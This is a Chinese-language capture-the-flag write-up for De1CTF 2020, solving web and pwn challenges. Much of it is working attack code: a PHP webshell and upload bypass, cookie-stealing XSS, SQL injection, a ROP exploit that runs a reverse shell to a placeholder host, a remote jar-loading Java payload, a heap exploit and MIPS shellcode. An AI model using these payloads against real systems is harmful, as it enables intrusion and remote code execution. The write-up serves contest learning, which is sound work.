# de1ctf 2020 Writeup

## web

### check in

考察上传绕过，一是在上传`.htaccess`时对关键字进行绕过，二是在传马时对`<?php`进行绕过。
构造.htaccess如下：

```
AddType application/x-httpd-p\
hp .jpg
```

将`jpg`解析为php，绕过关键字过滤上传。
由于是`php5.4`可以利用`<?=`替代`<?php`，上传一句话即可。

### Hard_pentest_1

![](https://i.imgur.com/oO25Nh7.png)

Burpsuite观察到服务器是Windows，可以用ntfs流绕php后缀`shell.php::$DATA`

shell参考这篇文章：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#\_4

```php
<?=$_=[]?><?=$_=@"$_"?><?=$_=$_['!'!='@']?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$_ = $__['!'!='@']?><?= =$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___ = $__?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___ .=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___ .= $__?><?=$__++?><?=$___.=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___.=$__?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___.=$__?><?=$_=[]?><?=$_=@"$_"?><?=$_=$_[@'!'=='@']?><?=$____='_'?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$____.=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$____.=$__?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$____.=$__?><?=$__++?><?=$____.=$__?><?=$_=$$____?><?=$___($_[_])?>
```

上传该shell之后，再写入一个普通的shell，即可蚁剑连接，并且上传nc反弹shell。

共享文件里有压缩包需要密码。

同时组策略泄漏了组管理员密码。
![](https://i.imgur.com/7CI5tlJ.png)

解密脚本参考文章：https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/

![](https://i.imgur.com/7EpeHuU.png)


### Animal Crossing

比赛期间没做出来，结束了突然有点思路了

绕ast+静态。window对象所有方法都能调，同时封锁了属性的调用

open可用，调到子页面直接打opener的资源就能避开父的属性调用了

```
http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&island=aa&fruit=aa"&name=url&data=amF2YXNjcmlwdDphbGVydChvcGVuZXIuZG9jdW1lbnQuY29va2llKQ==%27%3b%0aopen(atob(data))%3b%2F%2F
```

![-w442](https://i.loli.net/2020/05/08/q6T7nuFHUOYvip2.jpg)

看到有一半flag肯定后面还有东西。打一下源码，看看hint里的admin行为是想表达个啥

```
<img src="/island/test_01.png" class="island-img">
<img src="/island/test_02.png" class="island-img">
<img src="/island/test_03.png" class="island-img">
<img src="/island/test_04.png" class="island-img">
<img src="/island/test_05.png" class="island-img">
<img src="/island/test_06.png" class="island-img">
<img src="/island/test_07.png" class="island-img">
<img src="/island/test_08.png" class="island-img">
<img src="/island/test_09.png" class="island-img">
<img src="/island/test_10.png" class="island-img">
<img src="/island/test_11.png" class="island-img">
<img src="/island/test_12.png" class="island-img">
<img src="/island/test_13.png" class="island-img">
<img src="/island/test_14.png" class="island-img">
<img src="/island/test_15.png" class="island-img">
<img src="/island/test_16.png" class="island-img">
<img src="/island/test_17.png" class="island-img">
<img src="/island/test_18.png" class="island-img">
<img src="/island/test_19.png" class="island-img">
<img src="/island/test_20.png" class="island-img">
<img src="/island/test_21.png" class="island-img">
<img src="/island/test_22.png" class="island-img">
<img src="/island/test_23.png" class="island-img">
<img src="/island/test_24.png" class="island-img">
<img src="/island/test_25.png" class="island-img">
<img src="/island/test_26.png" class="island-img">
<img src="/island/test_27.png" class="island-img">
<img src="/island/test_28.png" class="island-img">
<img src="/island/test_29.png" class="island-img">
<img src="/island/test_30.png" class="island-img">
<img src="/island/test_31.png" class="island-img">
<img src="/island/test_32.png" class="island-img">
<img src="/island/test_33.png" class="island-img">
<img src="/island/test_34.png" class="island-img">
<img src="/island/test_35.png" class="island-img">
<img src="/island/test_36.png" class="island-img">
<img src="/island/test_37.png" class="island-img">
<img src="/island/test_38.png" class="island-img">
<img src="/island/test_39.png" class="island-img">
<img src="/island/test_40.png" class="island-img">
<img src="/island/test_41.png" class="island-img">
<img src="/island/test_42.png" class="island-img">
<img src="/island/test_43.png" class="island-img">
<img src="/island/test_44.png" class="island-img">
<img src="/island/test_45.png" class="island-img">
<img src="/island/test_46.png" class="island-img">
<img src="/island/test_47.png" class="island-img">
<img src="/island/test_48.png" class="island-img">
<img src="/island/test_49.png" class="island-img">
<img src="/island/test_50.png" class="island-img">
<img src="/island/test_51.png" class="island-img">
<img src="/island/test_52.png" class="island-img">
<img src="/island/test_53.png" class="island-img">
<img src="/island/test_54.png" class="island-img">
<img src="/island/test_55.png" class="island-img">
<img src="/island/test_56.png" class="island-img">
<img src="/island/test_57.png" class="island-img">
<img src="/island/test_58.png" class="island-img">
<img src="/island/test_59.png" class="island-img">
<img src="/island/test_60.png" class="island-img">
<img src="/island/test_61.png" class="island-img">
<img src="/island/test_62.png" class="island-img">
<img src="/island/test_63.png" class="island-img">
<img src="/island/test_64.png" class="island-img">
<img src="/island/test_65.png" class="island-img">
<img src="/island/test_66.png" class="island-img">
<img src="/island/test_67.png" class="island-img">
<img src"
```

看到这里，心想比赛结束了也就没继续了(工作量太大哭惹

可以看到管理员页面加载了很多img，但是直接会访问500。

很明显它这个意思就是想让我们拿到这些图片，我们得想办法找个能sreenshot的库，参考出题人的`html2canvas`：https://github.com/niklasvh/html2canvas，拉一个min出来就够用了

本地测试一下min的截图功能没有被阉割，nice
![-w1190](https://i.loli.net/2020/05/08/cYrIVQqNFBw4pRG.jpg)


剩下就是过CSP，self不能直接script引入外源库文件。但可以把png作为js文件加载来用，default-src script-src指定self都可过。之前有个google-jsonp的csp bypass，思路类似都是把自己当作跳板了
![-w1377](https://i.loli.net/2020/05/08/br9isOGjczD48TW.jpg)

把截图内容作为图片再次上传到upload，回调出来的url发到http-log就能读到剩下的flag了。测试一下打本地ok，成功拿到upload的图片
![-w1430](https://i.loli.net/2020/05/08/N1CPzpcLMbsj3Vy.jpg)

```
http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&island=aa&fruit=aa&name=url&data=amF2YXNjcmlwdDpmZXRjaCgnaHR0cDovLzEzNC4xNzUuMjMxLjExMzo4ODQ4L3N0YXRpYy9pbWFnZXMvMDIwYTQ1NDJiZDU5MmQ3MWYwM2MyN2Q3ZjdkOWRlZmQucG5nJykudGhlbihyZXM9PnJlcy50ZXh0KCkpLnRoZW4odHh0PT5ldmFsKHR4dCkp%27%3b%0aopen(atob(data))%3b%2F%2F
```


### mixture

首先是一个登录界面，尝试了：

```
http://49.51.251.99/member.php?orderby=limit 0,1 procedure analyse(1,1);
```

发现会提取最大最小值，证明这个地方写法如下：

```
order by id + $_GET[‘orderby’] 
```

```
http://134.175.185.244/member.php?orderby=,ISNULL(CASE%20WHEN%20(1=1)%20THEN%20BENCHMARK(2000000,SHA1(123))%20ELSE%202%20END)
```

利用benchmark延时注入可以得到，库名：
Information_schema,mysql,performance_schema,sys,test
表名
member,users
字段
member: id,username,password
users: id,username,money
爆破密码：
18a960a3a0b3554b314ebe77fe545c85
Md5解密goodlucktoyou

![](https://i.imgur.com/WAClYCc.png)

在select.php里面可以任意读取其他php的源码，发现在select.php里面有一个函数Minclude

admin.php里面暴露了phpinfo()
了解到这是一个出题人自己写的扩展，扩展位置在

```
/usr/local/lib/php/extensions/no-debug-non-zts-20170718/Minclude.so
```

使用curl命令

```
curl -O "http://134.175.185.244/select.php" -H "Cookie:PHPSESSID=1n26be800cjbdtdcto54u2aj2r" -d "search=/usr/local/lib/php/extensions/no-debug-non-zts-20170718/Minclude.so&submit=submit"
```

下载带有Minclude.so源码的网页，放入Winhex，从elf头7f 45 4c 46开始截取到末尾，获得完整的Minclude.so十六进制文件。

任意读之后，拿到 `Minclude.so` 需要利用其中的栈溢出，可以任意读出 maps 从而获取到地址，然后就是 rop 了。 rop 过程中发现栈上有两个地址被覆盖了，所以用 pop pop 跳过两个地址不用。

```python=
#encoding:utf-8
import requests
import sys
import os
from pwn import *
from Crypto.Util.number import *

s = requests.Session()

headers= {
    #"Cookie":"PHPSESSID=tkk1enrrlfrtn96baeigf4queo"
    "Cookie":"PHPSESSID=g6u5esdng9h7a2ei3m93srf0mp"
}
php_base = 0x7f546c3f7000
libc_base = 0x7f546eacb000
minclude_base = 0x7f546d84a000


#filename = "index.php" #Here input filename you want to read
INITIAL = 1526 - 9

def main():
    global INITIAL, php_base, minclude_base, libc_base
    if len(sys.argv) < 2:
        print('usage: {} path'.format(sys.argv[0]))
        return

    exp = False
    debug = False
    filename = sys.argv[1] #Here input filename you want to read
    if filename == 'exp' or filename == 'debug':
        if filename == 'debug':
            debug = True
            php_base = 0x7f40b6ec3000
            minclude_base = 0x7f40b6eba000
            libc_base = 0x7f40b7fa0000
        orig_ret = 0x7f546d151ac0
        pop_rdi = php_base + 0x000000000014b260 # pop rdi ; ret 
        php_info = 0x47bd10 - 0x100000 + php_base
        ret = php_base + 0x14b261
        jmp_rdi = php_base + 0x000000000019f729 # jmp rdi
        if debug:
            mov_to_rdi = 0x00000000000494ea + libc_base # mov qword ptr [rdi], rsi ; ret
        else:
            mov_to_rdi = 0x00000000000494e5 + libc_base # mov eax, 1 ; mov qword ptr [rdi], rsi ; ret
        pop_pop = 0x000000000000135e + minclude_base # pop rbp ; pop r12 ; ret
        pop_rsi = 0x000000000002440e + libc_base # pop rsi ; ret
        exp = True


        system = libc_base + 0x449c0
        halt = p64(pop_rdi) + p64(jmp_rdi) + p64(jmp_rdi)
        def write(addr, val):
            assert len(val) == 8
            return p64(pop_rdi) + p64(addr) + p64(pop_rsi) + val + p64(mov_to_rdi)
        area = minclude_base + 0x4000
        cmd = b"php -r '$sock=fsockopen(\"X.X.X.X\",52333);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        cur = 0
        rop = b''
        buf = cmd[:8]
        rop += write(area, buf)
        cur += 8
        buf = cmd[8:16]
        rop += write(area + 8, buf)
        cur += 8
        rop += p64(pop_pop)
        rop += p64(0xdeadbeef)
        rop += p64(0xdeadbeef)

        while cur < len(cmd):
            buf = cmd[cur: cur+8]
            if len(buf) != 8:
                buf = buf.ljust(8, b'\0')
            rop += write(area + cur, buf)
            cur += 8

        rop += p64(pop_rdi)
        rop += p64(area)
        rop += p64(system)
        rop += halt
        filename = b'a' * (0x88) + rop
    INITIAL += len(filename)

    

    if len(sys.argv) == 3:
        save_filename = sys.argv[2]
    else:
        save_filename = os.path.basename(filename)
    data = {
        "search":filename,
        "submit":"submit"
    }
    
    #url = "http://134.175.185.244/select.php"
    if debug:
        url = "http://localhost:51111/select.php"
    else:
        #url = "http://49.51.251.99/select.php"
        url = "http://134.175.185.244/select.php"
    r = requests.post(url, data=data, headers=headers)
    if not exp:
        f = open(save_filename, "wb")
        f.write(r.content[INITIAL:])
        f.close()
    else:
        print(r.content)

if __name__ == '__main__':
    main()

```

两个服务器的 php 好像都不一样，所以只能打一个服务器。

### calc

URLClassloader能过，服务器上放jar static块执行命令，远程加载下jar就行。

```
nEw%20java.net.URLClassLoader(nEw%20java.net.URL%5B%5D%20%7BnEw%20java.net.URL(%22http%3A%2F%2F139.199.x%3A3333%2Flfy.jar%22)%7D).loadClass(%22ws%22).getMethods()%5B0%5D.invoke(null)

```

第二种方法：直接利用Classloader也可以打通,python发送

```
T\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.nio.file.Files").readAllLines(T\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.nio.file.Paths").get("/flag"))
```


## pwn

### BroadcastTest

逆向APK可知程序中仅有MainActivity$Message和三个Receiver类。
前者实现了一个Parcelable类，后三个则是广播。
其中Receiver1是export的，接收并向Receiver2发送广播，Receiver2和3则非export，只能接收内部发送的广播。
功能为Receiver1接收base64传入的data，然后将其反序列化得到一个Bundle，再广播给Receiver2。
Receiver2检查Bundle中“command”存在且值非"getflag"，然后再次发送广播给Receiver3。
Receiver3检查Bundle中"command"存在且值为"getflag"，通过则回显正确。

简单搜索可以找到这篇[文章](https://www.ms509.com/2018/07/03/bundle-mismatch/)，描述了Parcel中对于读出和写入时类型不一致会产生的漏洞。
查看本题中Message类也是相同的，有两处不一致，分别是

```
this.txRate = in.readInt();
dest.writeByte((byte) this.txRate);
```

和

```
this.rttSpread = in.readLong();
dest.writeInt((int) this.rttSpread);
```

这会导致每次读写覆盖后4字节。注意Bundle内部序列化时是4字节对齐的，因此int和byte的类型不一致没有用。  
本题的目的是在读写一次以后产生一个新的键值对"command=getflag"，与文章中暴露恶意Intent的思路基本一致。  

Bundle中的map存储顺序是`Key长度, Key内容, Value类型, Value长度, Value内容`

因此思考一下可以构造出如下payload：

| Message         | len_key     | content_key                                                  | type_value  | len_value   | content_value   |      |
| --------------- | ----------- | ------------------------------------------------------------ | ----------- | ----------- | --------------- | ---- |
| pad             | 16 00 00 00 | 07 00 00 00 "command" 00 00 00 00 00 00 07 00 00 00 "getflag" 00 00 | 00 00 00 00 | 03 00 00 00 | "pad"           |      |
| pad 16 00 00 00 | 07 00 00 00 | "command" 00 00                                              | 00 00 00 00 | 07 00 00 00 | "getflag" 00 00 |      |

这里的String长度是2字节一个单位，应该是UTF-16格式，因此fake_key的长度是`(4+(7+1)*2+4+4+(7+1)*2)/2`，注意4字节对齐因此command后要手动补0。

即原来content_key中的内容扩展成一个键值对暴露出来使得Receiver3可见而Receiver2不可见。
完整构造代码如下：

```Java
        Parcel a = Parcel.obtain();
        Parcel b = Parcel.obtain();
        a.writeInt(3);//Count
        a.writeString("mismatch");
        a.writeInt(4);//Parcable
        a.writeString("com.de1ta.broadcasttest.MainActivity$Message");
        a.writeString("bssid");
        a.writeInt(1);
        a.writeInt(2);
        a.writeInt(3);
        a.writeInt(4);
        a.writeInt(5);
        a.writeInt(6);
        a.writeInt(7);
        a.writeLong(8);
        a.writeInt(9);
        a.writeInt(10);
        a.writeInt(-1);//int to byte, txRate
        a.writeLong(11);
        a.writeLong(12);
        a.writeLong(0x11223344);
        // fake key commandxxxgetflag
        a.writeString("\7\0command\0\0\0\7\0getflag\0");
        a.writeInt(0);//fake_type
        a.writeString("1");//fake_value
        a.writeString("command");//for bundle.getString("command")!=null
        a.writeInt(0);
        a.writeString("gotflag");
        int len = a.dataSize();
        b.writeInt(len);
        b.writeInt(0x4c444E42);
        b.appendFrom(a, 0, len);
        b.setDataPosition(0);

        byte[] raw = b.marshall();
        String output = Base64.encodeToString(raw, 0);
        Log.i("test", output);
```

### stl_container

```python
from pwn import *
r=remote("134.175.239.26","8848")

libc = ELF("./libc-2.27.so")
def mmenu(idx):
    r.sendlineafter(">> ",str(idx))

def add(typ,data):
    mmenu(str(typ))
    mmenu(1)
    r.sendafter("input data:",data)
def free(typ,idx):
    mmenu(str(typ))
    mmenu(2)
    if typ<3:
        r.sendlineafter("index?",str(idx))
def show(typ,idx):
    mmenu(str(typ))
    mmenu(3)
    r.sendlineafter("index?",str(idx))

add(2,'aaa')
add(2,'ccc')
for i in range(1,5):
    if i != 2:
        add(i,'a')
        add(i,'a')
for i in range(1,5):
    if i != 2:
        free(i,1)
        free(i,0)

free(2,0)
show(2,0)
r.recvuntil("data: ")
libc.address = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x3ebca0
for i in range(2,4):
    if i != 2:
        add(i,'a')
        add(i,'/bin/sh\x00')
add(2,'ccc')
free(2,0)
free(2,0)
add(2,p64(libc.sym['__free_hook']))
add(1,p64(libc.sym['system']))
free(3,0)
free(3,0)

r.interactive()
```

### code_runner

找pattern，针对每个 pattern 写解决方案就好了

```rust=
use pyo3::prelude::*;
use pyo3::wrap_pyfunction;
use std::{
    io::{
        self, Read, Seek, SeekFrom, Cursor, BufReader,
    },
};

fn is_bne(buf: &[u8]) -> bool {
    buf[3] == 0x14 || buf[3] == 0x15 || buf[3] == 0x16 || buf[3] == 0x17
}

fn is_mult(buf: &[u8]) -> bool {
    buf[3] <= 3 && buf[0] == 0x18 && buf[1] == 0
}

fn is_lbu(buf: &[u8]) -> bool {
    buf[3] == 0x90
    //buf[1] == 0x00 && buf[3] == 0x90 && (buf[2] == 0x42 || buf[2] == 0x43 || buf[2] == 0x44)
}

fn addiu_val(buf: &[u8]) -> Option<u8> {
    if buf[3] >= 0x24 && buf[3] <= 0x27 {
        Some(buf[0])
    } else {
        None
    }
}

fn is_addu(buf: &[u8]) -> bool {
    buf[0] == 0x21 &&
        buf[1] & 0b111 == 0 &&
        buf[3] <= 3
}

fn li_val(buf: &[u8]) -> Option<u16> {
    if buf[2] == 0x02 && buf[3] == 0x24 {
        Some(buf[1] as u16 * 0x100 + buf[0] as u16)
    } else {
        None
    }
}

fn is_andi(buf: &[u8]) -> bool {
    buf[3] == 0x30 || buf[3] == 0x31 || buf[3] == 0x32 || buf[3] == 0x33
}

fn is_xor(buf: &[u8]) -> bool {
    (
        buf[0] == 0x26 ||
        buf[0] == 0x66 ||
        buf[0] == 0xa6 ||
        buf[0] == 0xe6
    ) && buf[3] <= 3
}

fn is_beq(buf: &[u8]) -> bool {
    buf[2] != 0 && (buf[3] == 0x10 || buf[3] == 0x11 || buf[3] == 0x12 || buf[3] == 0x13)

}

fn is_fn_start(buf: &[u8]) -> bool {
    buf[0] == 0xe0 && buf[1] == 0xff && buf[2] == 0xbd && buf[3] == 0x27
}

#[derive(Debug)]
struct FunctionIter<'s> {
    pos: u64,
    n: usize,
    reader: BufReader<Cursor<&'s [u8]>>,
}

impl<'s> FunctionIter<'s> {
    fn new(reader: BufReader<Cursor<&'s [u8]>>, pos: u64) -> Self {
        Self {
            pos: pos,
            n: 0,
            reader: reader
        }
    }
}

impl<'s> Iterator for FunctionIter<'s> {
    type Item = Summary;

    fn next(&mut self) -> Option<Summary> {
        if self.n == 16 {
            None
        } else {
            let mut buf = [0u8; 4];
            loop {
                self.pos -= 4;
                self.reader.seek(SeekFrom::Start(self.pos)).unwrap();
                self.reader.read_exact(&mut buf).unwrap();
                if is_fn_start(&buf) {
                    self.n += 1;
                    println!("function at 0x{:x}", self.pos);
                    return Some(Summary::new(&mut self.reader));
                }
            }
        }
    }
}

#[derive(Default, Debug)]
struct Summary {
    comps: Vec<u16>,
    idxs: Vec<usize>,
    mult_cnt: u8,
    andi_cnt: u8,
    addu_cnt: u8,
    beq_cnt: u8,
    bne_cnt: u8,
    xor_cnt: u8,
    lbu_cnt: u8,
    beq_first: bool,
}

impl Summary {
    pub fn new(reader: &mut io::BufReader<Cursor<&[u8]>>) -> Self {
        let mut s = Self::default();
        s.beq_first = false;
        let mut ignore_lbu = 0;

        for i in (0..).step_by(4) {
            let mut cur = [0u8; 4];
            reader.read_exact(&mut cur).unwrap();
            if is_fn_start(&cur) {
                break;
            }

            if let Some(v) = li_val(&cur) {
                s.comps.push(v);
            } else if let Some(v) = addiu_val(&cur) {
                if v <= 3 {
                    s.idxs.push(v as usize);
                    ignore_lbu += 1;
                }
            } else if is_lbu(&cur) {
                s.lbu_cnt += 1;
                if ignore_lbu > 0 {
                    ignore_lbu -= 1;
                } else {
                    s.idxs.push(0);
                }
            } else if is_andi(&cur) {
                s.andi_cnt += 1;
            } else if is_beq(&cur) {
                println!("cur {:?} {}", cur, i);
                s.beq_cnt += 1;
                if s.bne_cnt == 0 {
                    s.beq_first = true;
                }
            } else if is_addu(&cur) {
                s.addu_cnt += 1;
            } else if is_bne(&cur) {
                s.bne_cnt += 1;
            } else if is_mult(&cur) {
                s.mult_cnt += 1;
            } else if is_xor(&cur) {
                s.xor_cnt += 1;
            }
        }

        s
    }
}

trait Pattern {
    fn validate(&self, s: &Summary) -> bool;
    fn solve(&self, s: &Summary) -> [u8; 4];
    fn what(&self) -> &'static str;
}

#[derive(Debug)]
struct SumEqualOr;

impl Pattern for SumEqualOr {
    fn validate(&self, s: &Summary) -> bool {
        s.beq_cnt == 3 && s.addu_cnt == 3
    }

    fn solve(&self, _: &Summary) -> [u8; 4] {
        // 1 / 256 not correct
        [0, 0, 0, 0]
    }

    fn what(&self) -> &'static str {
        "SumEqualOr"
    }
}

#[derive(Debug)]
struct XorComplicated;

impl Pattern for XorComplicated {
    fn validate(&self, s: &Summary) -> bool {
        s.andi_cnt == 5 && s.lbu_cnt == 10
    }

    fn solve(&self, s: &Summary) -> [u8; 4] {
        let cmp1 = s.comps[0] as u8;
        let cmp2 = s.comps[1] as u8;
        let idx = s.idxs[0];

        let mut solution = [0, 0, 0, 0];
        solution[(idx + 1) % 4] = cmp2;
        solution[idx] = cmp2 ^ cmp1;
        solution[(idx + 2) % 4] = (cmp1 & 0x7f) << 1;
        solution[(idx + 3) % 4] = cmp1 ^ solution[(idx + 2) % 4];

        solution
    }

    fn what(&self) -> &'static str {
        "XorComplicated"
    }
}


#[derive(Debug)]
struct IfLessThan;

impl Pattern for IfLessThan {
    fn validate(&self, s: &Summary) -> bool {
        s.mult_cnt == 8
    }

    fn solve(&self, s: &Summary) -> [u8; 4] {
        let i = s.idxs[0];

        let mut sol = [0u8; 4];
        println!("summary: {:?}", s);
        if s.beq_first {
            // v1 < v2
            println!("v1 < v2");
            if s.beq_cnt == 2 {
                // v1 < v2
                println!("v1 < v2");
                sol[i] = 0;
                sol[(i + 1) % 4] = 1;
                sol[(i + 2) % 4] = 2;
                sol[(i + 3) % 4] = 0;
            } else if s.bne_cnt == 1 && s.beq_cnt == 1 {
                // v2 < v1
                println!("v2 < v1");
                sol[i] = 0;
                sol[(i + 1) % 4] = 2;
                sol[(i + 2) % 4] = 1;
                sol[(i + 3) % 4] = 0;
            } else {
                panic!("summary error");
            }
        } else {
            // v2 < v1
            println!("v2 < v1");
            if s.bne_cnt == 2 {
                // v2 < v1
                println!("v2 < v1");
                sol[i] = 2;
                sol[(i + 1) % 4] = 0;
                sol[(i + 2) % 4] = 0;
                sol[(i + 3) % 4] = 1;
            } else if s.bne_cnt == 1 && s.beq_cnt == 1 {
                // v1 < v2
                println!("v1 < v2");
                sol[i] = 1;
                sol[(i + 2) % 4] = 0;
                sol[(i + 1) % 4] = 0;
                sol[(i + 3) % 4] = 2;
            } else {
                panic!("summary error");
            }
        }

        sol
        
    }

    fn what(&self) -> &'static str {
        "IfLessThan"
    }
}

#[derive(Debug)]
struct MultComplicated;

impl Pattern for MultComplicated {
    fn validate(&self, s: &Summary) -> bool {
        s.mult_cnt == 4
    }

    fn solve(&self, s: &Summary) -> [u8; 4] {
        let idx = s.idxs[0];
        let cmp1 = s.comps[0];
        let cmp2 = s.comps[1];

        let mut solution = [0u8; 4];
        solution[idx] = cmp1 as u8;
        solution[(idx + 1) % 4] = cmp2 as u8;
        solution[(idx + 2) % 4] = (cmp1 * cmp1) as u8;
        solution[(idx + 3) % 4] = ((solution[(idx + 1) % 4] * solution[(idx + 1) % 4] + solution[(idx + 2) % 4] * solution[(idx + 2) % 4]) - solution[idx] * solution[idx]) as u8;
        solution
    }

    fn what(&self) -> &'static str {
        "MultComplicated"
    }
}

#[derive(Debug)]
struct DirectComp;

impl Pattern for DirectComp {
    fn validate(&self, s: &Summary) -> bool {
        s.bne_cnt == 4 && s.lbu_cnt == 6
    }
    
    fn solve(&self, s: &Summary) -> [u8; 4] {
        let i = s.idxs[0];
        let mut sol = [0u8; 4];
        sol[(i + 3) % 4] = s.comps[0] as u8;
        sol[(i + 2) % 4] = s.comps[1] as u8;
        sol[(i + 1) % 4] = s.comps[0] as u8;
        sol[(i + 0) % 4] = s.comps[1] as u8;
        sol
    }

    fn what(&self) -> &'static str {
        "DirectComp"
    }
}

#[derive(Debug)]
struct Equation;

impl Pattern for Equation {
    fn validate(&self, s: &Summary) -> bool {
        s.addu_cnt == 8
    }

    fn solve(&self, s: &Summary) -> [u8; 4] {
        let a = s.comps[0];
        let b = s.comps[1];
        let c = s.comps[2];
        let d = s.comps[3];

        let i = s.idxs[0];
        let mut sol = [0u8; 4];

        let x3 = (d + b + c - 2 * a) / 3;
        let x2 = x3 + a - d;
        let x1 = x3 + a - c;
        let x0 = a - b + x3;
        sol[(i + 3) % 4] = x3 as u8;
        sol[(i + 2) % 4] = x2 as u8;
        sol[(i + 1) % 4] = x1 as u8;
        sol[i] = x0 as u8;

        sol
    }

    fn what(&self) -> &'static str {
        "Equation"
    }
}

#[pyfunction]
/// Formats the sum of two numbers as string
fn solve(bin: &[u8], first: u64) -> PyResult<Vec<u8>> {
    
    //let first_func_regex = Regex::new(r"\xe0\xff\xbd\x27\x1c\x00\xbf\xaf\x18\x00\xbe\xaf\x25\xf0\xa0\x03\x20\x00\xc4\xaf\x20\x00\xc4\x8f.{4}\x00\x00\x00\x00\x25\xe8\xc0\x03\x1c\x00\xbf\x8f").unwrap();
    //let first_func_regex = Regex::new(r"\xe0\xff\xbd\x27\x1c\x00\xbf\xaf\x18\x00\xbe\xaf\x25\xf0\xa0\x03\x20\x00\xc4\xaf\x20\x00\xc4\x8f").unwrap();
    //let pos = first_func_regex.find(bin).unwrap().start() as u64;
    let reader = io::BufReader::new(Cursor::new(bin));

    let mut answer = Vec::new();
    let patterns: Vec<Box<dyn Pattern>> = vec![
        Box::new(Equation),
        Box::new(DirectComp),
        Box::new(MultComplicated),
        Box::new(IfLessThan),
        Box::new(XorComplicated),
        Box::new(SumEqualOr),
    ];

    let mut i = 0;
    for s in FunctionIter::new(reader, first) {
        print!("solving {}...  ", i);
        let mut solved = false;
        for p in patterns.iter() {
            if p.validate(&s) {
                println!("pattern: {}", p.what());
                solved = true;
                answer.extend_from_slice(&p.solve(&s));
            }
        }

        if !solved {
            panic!("got unknown pattern, on function #{}", i);
        }

        i += 1;
    }

    Ok(answer)
}

/// This module is a python module implemented in Rust.
#[pymodule]
fn runner_solver(_py: Python, m: &PyModule) -> PyResult<()> {
    m.add_wrapped(wrap_pyfunction!(solve))?;

    Ok(())
}
```

```python=
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 anciety <anciety@anciety-pc>
#
# Distributed under terms of the MIT license.
import sys
import datetime
import os
import os.path
import base64
import gzip
import solver.target.release.runner_solver as solver
from pwn import *
context(os='linux', arch='mips', log_level='debug')
context.terminal = ['notiterm', '-t', 'iterm', '-e']

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.rr = tube.recvregex
tube.irt = tube.interactive

if len(sys.argv) > 2:
    DEBUG = 0
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])

    p = remote(HOST, PORT)
else:
    DEBUG = 1
    if len(sys.argv) == 2:
        PATH = sys.argv[1]

    p = process(PATH)

stage1 = '''
sc = """
move $a0,$zero
addi $a1,$t9,20
li $a2,0x7f
li $v0,SYS_read
syscall 0x40404
'''
stage1 = b'% \x00\x00\x14\x00%#\x7f\x00\x06$\xa3\x0f\x02$\x0c\x01\x01\x01'


stage2 = b"bi\t<//)5\xf4\xff\xa9\xafsh\t<n/)5\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd'  \xa0\x03\xfc\xff\xa0\xaf\xfc\xff\xbd'\xff\xff\x06(\xfc\xff\xa6\xaf\xfc\xff\xbd# 0\xa0\x03sh\t4\xfc\xff\xa9\xaf\xfc\xff\xbd'\xff\xff\x05(\xfc\xff\xa5\xaf\xfc\xff\xbd#\xfb\xff\x19$'( \x03 (\xbd\x00\xfc\xff\xa5\xaf\xfc\xff\xbd# (\xa0\x03\xab\x0f\x024\x0c\x01\x01\x01"

def main():
    # Your exploit script goes here
    p.rl()
    cond = p.rl()
    found = False
    for i in range(255):
        print(i)
        if found:
            break
        for j in range(255):
            if found:
                break
            for k in range(255):
                s = bytes([i, j, k])
                if eval(cond):
                    print(s)
                    p.ru('>')
                    p.sl(s)
                    found = True
                    break
    cur = datetime.datetime.now()
    p.ru(b'Binary Dump:\n')
    binary = p.ru('\n===')[:-3]
    binary = base64.b64decode(binary)
    binary = gzip.decompress(binary)
    p.ru('Faster > \n')
    try:
        regex = b"\xe0\xff\xbd\x27\x1c\x00\xbf\xaf\x18\x00\xbe\xaf\x25\xf0\xa0\x03\x20\x00\xc4\xaf\x20\x00\xc4\x8f"
        first = binary.index(regex)
        answer = bytes(solver.solve(binary, first))
        p.s(answer)
        #p.ru('Name\n')
        p.s('AAnciety')
        #p.ru('come')
        p.s(stage1)
    except:
        pass
    cur = datetime.datetime.now() - cur

    p.s(stage2)
    print(cur)


    with open('bin', 'wb') as f:
        f.write(binary)
